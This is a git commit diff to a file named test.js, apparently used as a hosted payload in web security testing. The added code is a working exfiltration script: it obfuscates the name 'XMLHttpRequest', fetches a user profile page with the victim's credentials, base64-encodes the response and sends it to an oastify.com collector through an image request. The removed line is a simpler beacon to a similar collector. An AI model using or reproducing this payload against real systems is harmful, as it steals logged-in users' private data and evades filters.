da39f0fdbc2257b80a5b19d4deb12359cbb81ee9
hackerwahab <hackertabish786@gmail.com>
2026-02-21 07:11:20 +0500

    Update test.js

--- test.js
+++ test.js
@@ -1,2 +1,24 @@
-var img = new Image();
-img.src = "https://5y4s6z11avxx5ome7h67ovoem5swgoacz.oastify.com/cdnjs";
+(() => {
+  try {
+    var url = "//lab1.demo-pentest.pp.ua/user/profile";
+    var name = ["XM", "LH", "tt", "pRe", "ques", "t"].join("");
+    var Ctor = window[name];
+    var req = new Ctor();
+    req.open("GET", url, true);
+    req.withCredentials = true;
+    req.onreadystatechange = () => {
+      if (req.readyState === 4 && req.status === 200) {
+        var text = req.responseText;
+        var b64 = btoa(unescape(encodeURIComponent(text)));
+        var exfil = "//87dvf2a4jy60ervhgkfaxyxhv81zpqje8.oastify.com/collect"
+          + "?source=" + encodeURIComponent(url)
+          + "&data=" + encodeURIComponent(b64);
+        var img = new Image();
+        img.src = exfil;
+      }
+    };
+    req.send(null);
+  } catch (e) {
+    console.log(e);
+  }
+})();
